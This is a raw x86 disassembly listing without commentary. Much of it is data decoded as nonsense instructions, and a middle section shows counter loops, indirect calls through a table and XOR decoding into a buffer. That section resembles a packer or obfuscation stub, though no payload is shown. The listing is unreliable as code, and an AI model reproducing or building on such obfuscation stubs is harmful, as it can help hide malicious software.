  40eeda:	sub    eax,0x9082c72
  40eedf:	sbb    ah,BYTE PTR [ebx+0x15]
  40eee2:	pop    ebx
  40eee3:	cmp    eax,0x7ce8dc08
  40eee8:	jbe    0x40ee8a
  40eeea:	and    eax,0x579d8044
  40eeef:	sbb    WORD PTR [edi*4+0x2996489c],ax
  40eef7:	idiv   DWORD PTR ds:0x22c4c56d
  40eefd:	scas   al,BYTE PTR es:[edi]
  40eefe:	sbb    BYTE PTR [esp+edx*1],dh
  40ef01:	inc    edx
  40ef02:	xchg   ebx,eax
  40ef03:	pusha  
  40ef04:	rol    BYTE PTR [ecx+0x40],1
  40ef07:	pop    ecx
  40ef08:	dec    eax
  40ef09:	pop    ebx
  40ef0a:	push   eax
  40ef0b:	push   ds
  40ef0c:	mov    ?,WORD PTR [ebx+0x38fb233]
  40ef12:	jnp    0x40eece
  40ef14:	retf   0x6a96
  40ef17:	cs cmp al,0xf1
  40ef1a:	mov    ds:0xb784475,eax
  40ef1f:	push   es
  40ef20:	sbb    DWORD PTR [esi],0xffffffb2
  40ef23:	out    0x5d,al
  40ef25:	in     eax,0x48
  40ef27:	jo     0x40eebe
  40ef29:	mov    al,0xda
  40ef2b:	(bad)
  40ef2e:	xchg   ebx,eax
  40ef2f:	pop    eax
  40ef30:	out    0x86,eax
  40ef32:	mov    BYTE PTR [ecx+0x4f],dl
  40ef35:	stos   DWORD PTR es:[edi],eax
  40ef36:	ds mov bl,0x41
  40ef39:	xor    DWORD PTR [edx],eax
  40ef3b:	adc    eax,0x736eec1a
  40ef40:	sbb    esi,DWORD PTR [ebx]
  40ef42:	loopne 0x40ef56
  40ef44:	or     eax,0xc543d215
  40ef49:	ja     0x40ef08
  40ef4b:	xchg   ebx,eax
  40ef4c:	popa   
  40ef4d:	shl    DWORD PTR [ebp+0x5f],0x9f
  40ef51:	nop
  40ef52:	jb     0x40ef6f
  40ef54:	ins    DWORD PTR es:[edi],dx
  40ef55:	cli    
  40ef56:	jp     0x40ef06
  40ef58:	jle    0x40ef1c
  40ef5a:	mov    esp,0x9113a360
  40ef5f:	inc    edx
  40ef60:	cmp    DWORD PTR [ebp-0x5e28fe0b],ecx
  40ef66:	pop    eax
  40ef67:	mov    dl,0xdf
  40ef69:	mov    eax,ds:0x6786898c
  40ef6e:	pop    eax
  40ef6f:	and    ecx,DWORD PTR [esi-0x3071c840]
  40ef75:	movzx  ecx,BYTE PTR [ebx-0x25]
  40ef79:	ret    
  40ef7a:	dec    edx
  40ef7b:	ins    DWORD PTR es:[edi],dx
  40ef7c:	bound  esp,QWORD PTR [ebx+ecx*8]
  40ef7f:	adc    eax,DWORD PTR [ecx-0x26]
  40ef82:	mov    eax,ds:0xa5bbdd16
  40ef87:	retf   0x1316
  40ef8a:	stos   BYTE PTR es:[edi],al
  40ef8b:	mov    ebx,0xc5506136
  40ef90:	out    dx,eax
  40ef91:	sub    DWORD PTR [eax+0x15],0x34
  40ef95:	and    edi,DWORD PTR [edi-0x1536d3d4]
  40ef9b:	call   0x5966:0x68879ba
  40efa2:	or     esp,DWORD PTR [edx+0x21]
  40efa5:	ret    0x476
  40efa8:	jmp    0xc839cb6e
  40efad:	add    al,0x95
  40efaf:	push   eax
  40efb0:	test   DWORD PTR [ecx],0x81ff458a
  40efb6:	and    eax,0x429018
  40efbb:	add    BYTE PTR [eax],al
  40efbd:	add    BYTE PTR [eax],al
  40efbf:	xor    ecx,ecx
  40efc1:	or     ecx,DWORD PTR ds:0x429018
  40efc7:	inc    ecx
  40efc8:	mov    DWORD PTR ds:0x429018,ecx
  40efce:	cmp    DWORD PTR ds:0x429018,0xa
  40efd5:	jne    0x40efe1
  40efdb:	call   DWORD PTR ds:0x42e9b3
  40efe1:	cmp    DWORD PTR ds:0x429018,0x9
  40efe8:	jne    0x40effb
  40efee:	mov    ecx,DWORD PTR ds:0x429018
  40eff4:	inc    ecx
  40eff5:	mov    DWORD PTR ds:0x429018,ecx
  40effb:	cmp    DWORD PTR ds:0x429018,0x1e
  40f002:	jb     0x40efbf
  40f008:	sub    DWORD PTR ds:0x42c014,ecx
  40f00e:	mov    ecx,DWORD PTR [ebp-0xc]
  40f011:	xor    al,0x73
  40f013:	sub    al,0x9
  40f015:	mov    DWORD PTR ds:0x42b000,0xef4
  40f01f:	mov    BYTE PTR [ecx],al
  40f021:	and    DWORD PTR ds:0x42b01c,0x42a004
  40f02b:	mov    DWORD PTR [ebp-0x18],0xf89c85b9
  40f032:	sbb    DWORD PTR ds:0x429024,0xfd3
  40f03c:	push   ebx
  40f03d:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  40f044:	mov    ecx,DWORD PTR [ebp-0x18]
  40f047:	xor    eax,0x6376
  40f04c:	push   esi
  40f04d:	and    DWORD PTR ds:0x42c01c,0x0
  40f057:	jmp    0x40f06a
  40f05c:	xor    eax,eax
  40f05e:	add    eax,DWORD PTR ds:0x42c01c
  40f064:	inc    eax
  40f065:	mov    ds:0x42c01c,eax
  40f06a:	cmp    DWORD PTR ds:0x42c01c,0x16
  40f071:	jae    0x40f0bd
  40f077:	cmp    DWORD PTR ds:0x42c01c,0x4
  40f07e:	jne    0x40f0a0
  40f084:	push   DWORD PTR [ebp-0x24]
  40f087:	push   0x42901c
  40f08c:	push   DWORD PTR [ebp-0x18]
  40f08f:	push   DWORD PTR [ebp-0x14]
  40f092:	push   DWORD PTR [ebp-0x24]
  40f095:	push   0x236f
  40f09a:	call   DWORD PTR ds:0x42e9b7
  40f0a0:	cmp    DWORD PTR ds:0x42c01c,0x3
  40f0a7:	jne    0x40f0b8
  40f0ad:	mov    eax,ds:0x42c01c
  40f0b2:	inc    eax
  40f0b3:	mov    ds:0x42c01c,eax
  40f0b8:	jmp    0x40f05c
  40f0bd:	mov    eax,0x7510899
  40f0c2:	xor    ecx,eax
  40f0c4:	mov    esi,0x3272e0
  40f0c9:	adc    DWORD PTR ds:0x42a014,0x429010
  40f0d3:	push   edi
  40f0d4:	add    ecx,esi
  40f0d6:	jmp    0x40f0fa
  40f0db:	mov    DWORD PTR ds:0x42c014,0x1850
  40f0e5:	mov    dl,BYTE PTR [ebp-0x1]
  40f0e8:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  40f0ef:	mov    DWORD PTR ds:0x42a00c,0x213a
  40f0f9:	inc    ecx
  40f0fa:	mov    DWORD PTR ds:0x42b000,0x51ce
  40f104:	cmp    ecx,0x40
  40f107:	jb     0x40f0db
  40f10d:	mov    edx,DWORD PTR [ebp-0x18]
  40f110:	xor    edx,eax
  40f112:	add    edx,esi
  40f114:	mov    DWORD PTR ds:0x42c00c,0x7eb4
  40f11e:	jmp    0x40f1de
  40f123:	sub    DWORD PTR ds:0x42d018,edi
  40f129:	mov    edi,DWORD PTR [ebp+0x8]
  40f12c:	and    DWORD PTR ds:0x42d008,0x0
  40f136:	jmp    0x40f14a
  40f13b:	xor    ecx,ecx
  40f13d:	or     ecx,DWORD PTR ds:0x42d008
  40f143:	inc    ecx
  40f144:	mov    DWORD PTR ds:0x42d008,ecx
  40f14a:	cmp    DWORD PTR ds:0x42d008,0x18
  40f151:	jae    0x40f175
  40f157:	cmp    DWORD PTR ds:0x42d008,0x26
  40f15e:	jne    0x40f16a
  40f164:	call   DWORD PTR ds:0x42e9bb
  40f16a:	jmp    0x40f13b
  40f16f:	xor    DWORD PTR ds:0x42a00c,edx
  40f175:	mov    ecx,0x8a8c
  40f17a:	xor    DWORD PTR ds:0x42a004,0x50dc
  40f184:	xor    cx,WORD PTR [edi+edx*4+0x2]
  40f189:	mov    edi,0x3b50
  40f18e:	add    DWORD PTR ds:0x429008,0x42b008
  40f198:	add    cx,di
  40f19b:	xor    DWORD PTR ds:0x429018,0x2fa9
  40f1a5:	movzx  ecx,cx
  40f1a8:	mov    DWORD PTR [ebp-0xc],ecx
  40f1ab:	mov    ecx,DWORD PTR [ebp+0x8]
  40f1ae:	add    DWORD PTR ds:0x42b000,0x4595
  40f1b8:	movzx  ecx,WORD PTR [ecx+edx*4]
  40f1bc:	mov    DWORD PTR ds:0x42c010,0x3cf8
  40f1c6:	xor    ecx,0x8a8c
  40f1cc:	add    ecx,edi
  40f1ce:	mov    edi,0x13c
  40f1d3:	mov    edi,DWORD PTR [ebp-0xc]
  40f1d6:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  40f1dd:	inc    edx
  40f1de:	mov    DWORD PTR ds:0x42c008,0x3284
  40f1e8:	mov    ecx,DWORD PTR [ebp-0x10]
  40f1eb:	mov    DWORD PTR ds:0x42d00c,0x2d6d
  40f1f5:	cmp    edx,ecx
  40f1f7:	jne    0x40f123
  40f1fd:	xor    edi,DWORD PTR ds:0x42900c
  40f203:	mov    ecx,DWORD PTR [ebp-0x18]
  40f206:	and    DWORD PTR ds:0x429024,0x0
  40f210:	jmp    0x40f224
  40f215:	xor    edx,edx
  40f217:	or     edx,DWORD PTR ds:0x429024
  40f21d:	inc    edx
  40f21e:	mov    DWORD PTR ds:0x429024,edx
  40f224:	cmp    DWORD PTR ds:0x429024,0x10
  40f22b:	jae    0x40f27a
  40f231:	cmp    DWORD PTR ds:0x429024,0xa
  40f238:	jne    0x40f24f
  40f23e:	push   DWORD PTR [ebp-0x14]
  40f241:	push   0x42b018
  40f246:	push   DWORD PTR [ebp-0x14]
  40f249:	call   DWORD PTR ds:0x42e9bf
  40f24f:	cmp    DWORD PTR ds:0x429024,0x9
  40f256:	jne    0x40f26b
  40f25c:	xor    edx,edx
  40f25e:	xor    edx,DWORD PTR ds:0x429024
  40f264:	inc    edx
  40f265:	mov    DWORD PTR ds:0x429024,edx
  40f26b:	jmp    0x40f215
  40f270:	adc    DWORD PTR ds:0x42d00c,0x5b30
  40f27a:	mov    edx,DWORD PTR [ebp+0x10]
  40f27d:	xor    edi,0x523a
  40f283:	xor    ecx,eax
  40f285:	dec    DWORD PTR ds:0x42b010
  40f28b:	add    ecx,esi
  40f28d:	mov    DWORD PTR [edx],ecx
  40f28f:	sbb    DWORD PTR ds:0x42d004,0x42a008
  40f299:	mov    ecx,DWORD PTR [ebp-0x18]
  40f29c:	inc    edi
  40f29d:	xor    ecx,eax
  40f29f:	mov    edi,DWORD PTR ds:0x42a000
  40f2a5:	xor    DWORD PTR ds:0x42a004,edi
  40f2ab:	add    ecx,esi
  40f2ad:	mov    DWORD PTR ds:0x42d000,0x15
  40f2b7:	cmp    DWORD PTR ds:0x42d000,0x0
  40f2be:	je     0x40f2f6
  40f2c4:	cmp    DWORD PTR ds:0x42d000,0x1a
  40f2cb:	jne    0x40f2e4
  40f2d1:	push   0x42e111
  40f2d6:	push   0x42e0c7
  40f2db:	push   DWORD PTR [ebp-0x20]
  40f2de:	call   DWORD PTR ds:0x42e9c7
  40f2e4:	mov    edi,DWORD PTR ds:0x42d000
  40f2ea:	dec    edi
  40f2eb:	mov    DWORD PTR ds:0x42d000,edi
  40f2f1:	jmp    0x40f2b7
  40f2f6:	mov    DWORD PTR [ebp-0xc],ecx
  40f2f9:	not    edi
  40f2fb:	mov    DWORD PTR [ebp+0x8],0xf89c85b9
  40f302:	mov    DWORD PTR [ebp-0x14],0xf89c85a9
  40f309:	mov    DWORD PTR [ebp-0x10],0xf89c95b9
  40f310:	and    DWORD PTR ds:0x42b010,ecx
  40f316:	mov    ecx,DWORD PTR [ebp-0x14]
  40f319:	mov    DWORD PTR ds:0x42b018,0x1d
  40f323:	cmp    DWORD PTR ds:0x42b018,0x0
  40f32a:	je     0x40f37c
  40f330:	cmp    DWORD PTR ds:0x42b018,0xc
  40f337:	jne    0x40f348
  40f33d:	push   0x42e0d9
  40f342:	call   DWORD PTR ds:0x42e9cb
  40f348:	cmp    DWORD PTR ds:0x42b018,0xd
  40f34f:	jne    0x40f362
  40f355:	mov    edi,DWORD PTR ds:0x42b018
  40f35b:	dec    edi
  40f35c:	mov    DWORD PTR ds:0x42b018,edi
  40f362:	xor    edi,edi
  40f364:	xor    edi,DWORD PTR ds:0x42b018
  40f36a:	dec    edi
  40f36b:	mov    DWORD PTR ds:0x42b018,edi
  40f371:	jmp    0x40f323
  40f376:	not    DWORD PTR ds:0x42d018
  40f37c:	mov    DWORD PTR [ebp+0x8],ecx
  40f37f:	sub    edi,ecx
  40f381:	mov    ecx,DWORD PTR [ebp+0x8]
  40f384:	and    DWORD PTR ds:0x42a010,0x408f
  40f38e:	xor    ecx,eax
  40f390:	add    ecx,esi
  40f392:	mov    ecx,0x242ebed
  40f397:	not    edi
  40f399:	mov    edi,0xf641bea
  40f39e:	je     0x418714
  40f3a4:	mov    edx,DWORD PTR [ebp+0x8]
  40f3a7:	or     DWORD PTR ds:0x429008,0x3119
  40f3b1:	mov    ebx,DWORD PTR [ebp-0x8]
  40f3b4:	adc    DWORD PTR ds:0x42a018,0x42c014
  40f3be:	xor    edx,eax
  40f3c0:	xor    ebx,eax
  40f3c2:	sub    DWORD PTR ds:0x42c004,0x429010
  40f3cc:	sub    edx,ebx
  40f3ce:	sub    edx,esi
  40f3d0:	xor    edx,eax
  40f3d2:	mov    DWORD PTR [ebp+0x8],edx
  40f3d5:	inc    DWORD PTR ds:0x42b010
  40f3db:	mov    edx,DWORD PTR [ebp+0x8]
  40f3de:	mov    ebx,DWORD PTR [ebp-0x58]
  40f3e1:	add    edx,0x5708f8
  40f3e7:	sub    DWORD PTR ds:0x42c01c,0x72ca
  40f3f1:	imul   edx,ebx
  40f3f4:	xor    DWORD PTR ds:0x429024,edi
  40f3fa:	mov    DWORD PTR [ebp-0x58],edx
  40f3fd:	and    DWORD PTR ds:0x42d004,0x0
  40f407:	mov    ebx,DWORD PTR ds:0x42d004
  40f40d:	inc    ebx
  40f40e:	mov    DWORD PTR ds:0x42d004,ebx
  40f414:	cmp    DWORD PTR ds:0x42d004,0x1e
  40f41b:	jne    0x40f42c
  40f421:	push   0x42a004
  40f426:	call   DWORD PTR ds:0x42e9d3
  40f42c:	cmp    DWORD PTR ds:0x42d004,0x17
  40f433:	jb     0x40f407
  40f439:	mov    edx,DWORD PTR [ebp+0x8]
  40f43c:	mov    ebx,DWORD PTR [ebp-0x54]
  40f43f:	add    edx,0x64f8da
  40f445:	xor    DWORD PTR ds:0x42b004,0x42b000
  40f44f:	or     edx,ebx
  40f451:	adc    DWORD PTR ds:0x42c014,0x3307
  40f45b:	mov    DWORD PTR [ebp-0x54],edx
  40f45e:	add    DWORD PTR ds:0x42d004,0x3241
  40f468:	mov    edx,DWORD PTR [ebp+0x8]
  40f46b:	sub    DWORD PTR ds:0x42900c,0x6cc3
  40f475:	mov    ebx,DWORD PTR [ebp-0x50]
  40f478:	xor    DWORD PTR ds:0x42b014,0x42c01c
  40f482:	add    edx,ecx
  40f484:	adc    DWORD PTR ds:0x42c000,0x429028
  40f48e:	xor    edx,ebx
  40f490:	mov    DWORD PTR [ebp-0x50],edx
  40f493:	and    DWORD PTR ds:0x429018,0x0
  40f49d:	mov    ebx,DWORD PTR ds:0x429018
  40f4a3:	inc    ebx
  40f4a4:	mov    DWORD PTR ds:0x429018,ebx
  40f4aa:	cmp    DWORD PTR ds:0x429018,0x1f
  40f4b1:	jne    0x40f4cc
  40f4b7:	push   0x42c010
  40f4bc:	push   0x42c018
  40f4c1:	push   0x42a008
  40f4c6:	call   DWORD PTR ds:0x42e993
  40f4cc:	cmp    DWORD PTR ds:0x429018,0x1e
  40f4d3:	jb     0x40f49d
  40f4d9:	inc    edx
  40f4da:	mov    edx,DWORD PTR [ebp+0x8]
  40f4dd:	mov    ebx,DWORD PTR [ebp-0x4c]
  40f4e0:	add    DWORD PTR ds:0x42d010,0x42d01c
  40f4ea:	add    edx,edi
  40f4ec:	adc    DWORD PTR ds:0x42d018,0x42b01c
  40f4f6:	and    edx,ebx
  40f4f8:	mov    DWORD PTR [ebp-0x4c],edx
  40f4fb:	or     edx,DWORD PTR ds:0x42b000
  40f501:	mov    edx,DWORD PTR [ebp+0x8]
  40f504:	mov    ebx,DWORD PTR ds:0x42d000
  40f50a:	sub    DWORD PTR ds:0x42a000,ebx
  40f510:	mov    ebx,DWORD PTR [ebp-0x48]
  40f513:	or     DWORD PTR ds:0x42c000,0x42c010
  40f51d:	lea    edx,[ebx+edx*1+0x241fc1f]
  40f524:	mov    DWORD PTR [ebp-0x48],edx
  40f527:	mov    edx,DWORD PTR [ebp+0x8]
  40f52a:	mov    ebx,0xfa5e15e2
  40f52f:	inc    DWORD PTR ds:0x42d018
  40f535:	sub    ebx,edx
  40f537:	movzx  edx,WORD PTR ds:0x42c018
  40f53e:	adc    edx,DWORD PTR ds:0x429028
  40f544:	mov    DWORD PTR ds:0x42c018,edx
  40f54a:	add    ebx,DWORD PTR [ebp-0x44]
  40f54d:	mov    DWORD PTR [ebp-0x44],ebx
  40f550:	and    DWORD PTR ds:0x42b018,0x0
  40f55a:	jmp    0x40f56c
  40f55f:	mov    edx,DWORD PTR ds:0x42b018
  40f565:	inc    edx
  40f566:	mov    DWORD PTR ds:0x42b018,edx
  40f56c:	cmp    DWORD PTR ds:0x42b018,0x19
  40f573:	jae    0x40f616
  40f579:	cmp    DWORD PTR ds:0x42b018,0x6
  40f580:	jne    0x40f594
  40f586:	push   0x0
  40f588:	push   DWORD PTR [ebp-0x10]
  40f58b:	push   DWORD PTR [ebp-0x28]
  40f58e:	call   DWORD PTR ds:0x42e997
  40f594:	cmp    DWORD PTR ds:0x42b018,0x5
  40f59b:	jne    0x40f5ae
  40f5a1:	mov    edx,DWORD PTR ds:0x42b018
  40f5a7:	inc    edx
  40f5a8:	mov    DWORD PTR ds:0x42b018,edx
  40f5ae:	jmp    0x40f55f
  40f5b3:	mov    DWORD PTR ds:0x42b00c,0x18
  40f5bd:	cmp    DWORD PTR ds:0x42b00c,0x0
  40f5c4:	je     0x40f616
  40f5ca:	cmp    DWORD PTR ds:0x42b00c,0x1e
  40f5d1:	jne    0x40f5fa
  40f5d7:	push   0x3551
  40f5dc:	push   DWORD PTR [ebp-0x28]
  40f5df:	push   0x42c000
  40f5e4:	push   DWORD PTR [ebp-0x10]
  40f5e7:	push   0x1896
  40f5ec:	push   0x8105
  40f5f1:	push   DWORD PTR [ebp-0xc]
  40f5f4:	call   DWORD PTR ds:0x42e99f
  40f5fa:	mov    edx,DWORD PTR ds:0x42b00c
  40f600:	dec    edx
  40f601:	mov    DWORD PTR ds:0x42b00c,edx
  40f607:	jmp    0x40f5bd
  40f60c:	add    DWORD PTR ds:0x42d00c,0x25c6
  40f616:	mov    edx,DWORD PTR [ebp+0x8]
  40f619:	adc    DWORD PTR ds:0x42d018,0x42a00c
  40f623:	xor    edx,eax
  40f625:	adc    DWORD PTR ds:0x42b010,0x4589
  40f62f:	add    edx,esi
  40f631:	mov    DWORD PTR ds:0x42d014,0x3f58
  40f63b:	jne    0x40f3a4
  40f641:	jmp    0x418714
  40f646:	adc    edx,edx
  40f648:	mov    edx,DWORD PTR [ebp-0xc]
  40f64b:	sub    edx,esi
  40f64d:	xor    edx,eax
  40f64f:	mov    DWORD PTR [ebp-0x5c],edx
  40f652:	mov    edx,DWORD PTR [ebp-0x10]
  40f655:	mov    ebx,DWORD PTR [ebp-0x8]
  40f658:	xor    edx,eax
  40f65a:	xor    ebx,eax
  40f65c:	sub    edx,ebx
  40f65e:	sub    edx,esi
  40f660:	xor    edx,eax
  40f662:	mov    DWORD PTR [ebp-0x10],edx
  40f665:	mov    edx,DWORD PTR [ebp-0x14]
  40f668:	mov    DWORD PTR [ebp+0x8],edx
  40f66b:	jmp    0x411a66
  40f670:	mov    edx,DWORD PTR [ebp+0x8]
  40f673:	mov    ebx,DWORD PTR [ebp-0x8]
  40f676:	xor    edx,eax
  40f678:	xor    ebx,eax
  40f67a:	sub    edx,ebx
  40f67c:	sub    edx,esi
  40f67e:	xor    edx,eax
  40f680:	mov    DWORD PTR [ebp+0x8],edx
  40f683:	jmp    0x411a09
  40f688:	aaa    
  40f689:	xchg   BYTE PTR [edi-0x3a],cl
  40f68c:	jae    0x40f709
  40f68e:	mov    ebx,0xae43537b
  40f693:	xor    al,0xd0
  40f695:	fild   QWORD PTR [ecx-0x46]
  40f698:	xchg   edx,ecx
  40f69a:	jp     0x40f716
  40f69c:	add    DWORD PTR [edi+0x7a],ebx
  40f69f:	jp     0x40f676
  40f6a1:	and    al,0x72
  40f6a3:	and    al,BYTE PTR [ecx+0x545228b8]
  40f6a9:	stos   BYTE PTR es:[edi],al
  40f6aa:	and    DWORD PTR [esi-0x78],ebp
  40f6ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6ae:	cmp    DWORD PTR ds:0xfd80bc2a,0x30
  40f6b5:	push   ebx
  40f6b6:	xchg   ecx,eax
  40f6b7:	lea    ebp,[edi-0xa]
  40f6ba:	lds    edx,FWORD PTR ds:0xcfb9812b
  40f6c0:	icebp  
  40f6c1:	sbb    edi,ecx
  40f6c3:	sub    eax,0x4b901e13
  40f6c8:	sub    BYTE PTR [ecx+0x52],dl
  40f6cb:	mov    dh,BYTE PTR [esi]
  40f6cd:	repz add eax,0x53127cf5
  40f6d3:	jp     0x40f6bd
  40f6d5:	fisub  DWORD PTR [eax+0x32]
  40f6d8:	adc    DWORD PTR [eax],ecx
  40f6da:	int    0x7c
  40f6dc:	data16 mov ah,0xa0
  40f6df:	mov    esi,0xd9de03a6
  40f6e4:	hlt    
  40f6e5:	adc    eax,0xa720ce5d
  40f6ea:	rcr    BYTE PTR [ebp+eiz*1+0x354eac1b],1
  40f6f1:	sar    BYTE PTR [edi],1
  40f6f3:	pop    es
  40f6f4:	adc    eax,0x41032024
  40f6f9:	shr    ah,0x32
  40f6fc:	adc    bl,BYTE PTR [esi+0x4b88279a]
  40f702:	(bad)  
  40f704:	xchg   edi,eax
  40f705:	fisttp DWORD PTR [eax]
  40f707:	fisub  DWORD PTR [ebx-0x6a0837a9]
  40f70d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f70e:	xor    DWORD PTR [esi+edx*1-0x1],0x16945c0c
  40f716:	loope  0x40f71d
  40f718:	test   DWORD PTR [eax+0x7b],ecx
  40f71b:	and    eax,0xa8dc8854
  40f720:	pop    ebp
  40f721:	adc    al,0xe3
  40f723:	push   es
  40f724:	xchg   edx,eax
  40f725:	sub    eax,0x5f6b21a5
  40f72a:	mov    edx,0xc2f590af
  40f72f:	sbb    eax,0xcd27fa33
  40f734:	mov    cl,BYTE PTR [ecx+0x52c9635c]
  40f73a:	sub    esp,DWORD PTR [ebx-0x33]
  40f73d:	in     eax,dx
  40f73e:	push   esi
  40f73f:	(bad)  
  40f740:	aad    0x63
  40f742:	inc    edx
  40f743:	sub    al,0xb3
  40f745:	xchg   esi,eax
  40f746:	mov    eax,0xb0ae1869
  40f74b:	lods   al,BYTE PTR ds:[esi]
  40f74c:	shr    DWORD PTR [ecx-0x4c55df8b],0x2d
  40f753:	cs std 
  40f755:	aam    0xfb
  40f757:	push   eax
  40f758:	(bad)  
  40f759:	jmp    FWORD PTR [ebp-0x562192b5]
  40f75f:	pop    ds
  40f760:	mov    ebx,0xc563cac8
  40f765:	cmp    ch,dl
  40f767:	jl     0x40f7ab
  40f769:	xor    edx,eax
  40f76b:	fidiv  DWORD PTR [edi+0xde980ae]
  40f771:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f772:	lock pop esi
  40f774:	jecxz  0x40f7f2
  40f776:	mov    al,ds:0x6f4fe93a
  40f77b:	in     eax,0x80
  40f77d:	stos   BYTE PTR es:[edi],al
  40f77e:	cmp    DWORD PTR [esi],eax
  40f780:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f781:	push   0x9a0f03a
  40f786:	and    eax,0x41057df4
  40f78b:	aaa    
  40f78c:	push   ecx
  40f78d:	inc    ecx
  40f78e:	xor    esi,0x71e2a355
  40f794:	pop    es
  40f795:	xacquire xchg BYTE PTR [eax+0x2c],al
  40f799:	push   0xffffff85
  40f79b:	push   ebx
  40f79c:	mov    ch,0xbe
  40f79e:	xchg   ebx,eax
  40f79f:	test   ah,ah
  40f7a1:	mov    esp,0x8963766d
  40f7a6:	and    edi,edi
  40f7a8:	mov    cl,0x32
  40f7aa:	add    cl,BYTE PTR [eax+edi*4]
  40f7ad:	or     BYTE PTR [ebp+ecx*8-0x7aed2ac5],dh
  40f7b4:	in     eax,dx
  40f7b5:	loopne 0x40f767
  40f7b7:	(bad)  
  40f7b8:	jecxz  0x40f759
  40f7ba:	repnz push ss
  40f7bc:	sbb    BYTE PTR [ecx-0x3b2ea95],0x6d
  40f7c3:	mov    ah,0x60
  40f7c5:	xchg   esi,eax
  40f7c6:	jno    0x40f841
  40f7c8:	mov    eax,0x39fa056f
  40f7cd:	dec    esi
  40f7ce:	fwait
  40f7cf:	mov    edi,0x1d789e76
  40f7d4:	(bad)  
  40f7d5:	xchg   edx,eax
  40f7d6:	stos   DWORD PTR es:[edi],eax
  40f7d7:	imul   edi,DWORD PTR [edx+0xb],0x58
  40f7db:	ss jl  0x40f779
  40f7de:	lods   al,BYTE PTR ds:[esi]
  40f7df:	pop    esp
  40f7e0:	and    eax,eax
  40f7e2:	push   ebx
  40f7e3:	dec    ebp
  40f7e4:	push   ss
  40f7e5:	in     eax,0x33
  40f7e7:	jge    0x40f863
  40f7e9:	loopne 0x40f852
  40f7eb:	dec    ecx
  40f7ec:	(bad)
  40f7ef:	cmp    DWORD PTR [bx+si],ecx
  40f7f2:	cmp    al,0xb1
  40f7f4:	jno    0x40f7a1
  40f7f6:	sahf   
  40f7f7:	ja     0x40f7f5
  40f7f9:	pop    esi
  40f7fa:	hlt    
  40f7fb:	lahf   
  40f7fc:	jns    0x40f80a
  40f7fe:	inc    esi
  40f7ff:	test   eax,0x6e06d6cd
  40f804:	or     dl,BYTE PTR [esi+0x46]
  40f807:	std    
  40f808:	adc    DWORD PTR [edx+0x4c7cb7dc],edi
  40f80e:	dec    esp
  40f80f:	add    cl,bh
  40f811:	cdq    
  40f812:	jl     0x40f88f
  40f814:	push   edi
  40f815:	sbb    BYTE PTR [edx],bl
  40f817:	xchg   edi,eax
  40f818:	push   0x4efe4fee
  40f81d:	call   0x8023669e
  40f822:	scas   eax,DWORD PTR es:[edi]
  40f823:	mov    ch,BYTE PTR [edi+0x16]
  40f826:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f827:	xchg   ebx,eax
  40f828:	pop    ecx
  40f829:	pushf  
  40f82a:	gs in  al,dx
  40f82c:	pop    esi
  40f82d:	cmp    esi,esp
  40f82f:	outs   dx,BYTE PTR ds:[esi]
  40f830:	(bad)  
  40f831:	leave  
  40f832:	xor    BYTE PTR [ebx+eax*8+0x3a720f72],bh
  40f839:	in     al,0x9b
  40f83b:	xor    eax,0x945b644f
  40f840:	out    0xf2,eax
  40f842:	fisubr WORD PTR [eax]
  40f844:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f845:	or     al,0x11
  40f847:	repz les edx,FWORD PTR [eax]
  40f84a:	stos   BYTE PTR es:[edi],al
  40f84b:	cmp    BYTE PTR [ebx+0x1dc54a5c],bh
  40f851:	xchg   ebp,eax
  40f852:	daa    
  40f853:	add    bh,BYTE PTR [edx]
  40f855:	xchg   ebx,esi
  40f857:	ins    DWORD PTR es:[edi],dx
  40f858:	loope  0x40f7f3
  40f85a:	mov    ebx,0x6bae93b6
  40f85f:	cmp    BYTE PTR [esi+0xf945919],ah
  40f865:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f866:	lock xor bl,BYTE PTR [eax-0xc]
  40f86a:	dec    ebx
  40f86b:	aaa    
  40f86c:	mov    DWORD PTR [edi+0x76751311],edx
  40f872:	xchg   edx,eax
  40f873:	jb     0x40f869
  40f875:	mov    DWORD PTR [eax],ebp
  40f877:	jmp    0x93cd599c
  40f87c:	out    dx,eax
  40f87d:	lods   al,BYTE PTR ds:[esi]
  40f87e:	pop    ebx
  40f87f:	dec    ebx
  40f880:	das    
  40f881:	lea    edi,[eax+0x15]
  40f884:	test   al,0x81
  40f886:	aaa    
  40f887:	aam    0x9f
  40f889:	ror    DWORD PTR [eax],1
  40f88b:	adc    eax,0x5d39684a
  40f890:	(bad)  [ebx]
  40f892:	lds    esp,FWORD PTR [edi]
  40f894:	cmp    ecx,esi
  40f896:	or     esi,DWORD PTR [eax+0x275ec5b5]
  40f89c:	jg     0x40f8c3
  40f89e:	fstp   st(5)
  40f8a0:	popf   
  40f8a1:	push   ebp
  40f8a2:	aas    
  40f8a3:	or     ebp,DWORD PTR [edi+0x4b]
  40f8a6:	pop    ecx
  40f8a7:	sub    eax,0xf09f714
  40f8ac:	add    esp,DWORD PTR [edi]
  40f8ae:	dec    cl
  40f8b0:	jl     0x40f90f
  40f8b2:	loop   0x40f8b4
  40f8b4:	sbb    esi,DWORD PTR [edx]
  40f8b6:	ror    DWORD PTR [edi-0x60],1
  40f8b9:	dec    esi
  40f8ba:	jmp    0xfeee:0xca3acf2b
  40f8c1:	call   0x90c66b04
  40f8c6:	(bad)  
  40f8c7:	adc    eax,0x1152b47d
  40f8cc:	fsubr  DWORD PTR [esp+ecx*2-0x53]
  40f8d0:	les    esi,FWORD PTR [ebx+ebp*4+0x11100f1f]
  40f8d7:	sbb    edi,DWORD PTR [edi+ebx*2-0x55475eb4]
  40f8de:	sub    ebx,eax
  40f8e0:	mov    eax,0xc47fa2b2
  40f8e5:	and    eax,0xb9918676
  40f8ea:	fist   DWORD PTR [edx-0x65fb99c9]
  40f8f0:	mov    eax,ds:0xffabcba7
  40f8f5:	cwde   
  40f8f6:	cmp    DWORD PTR [ecx],ebp
  40f8f8:	pop    esp
  40f8f9:	sub    eax,0xf2b8355f
  40f8fe:	mov    ds:0x981c157,eax
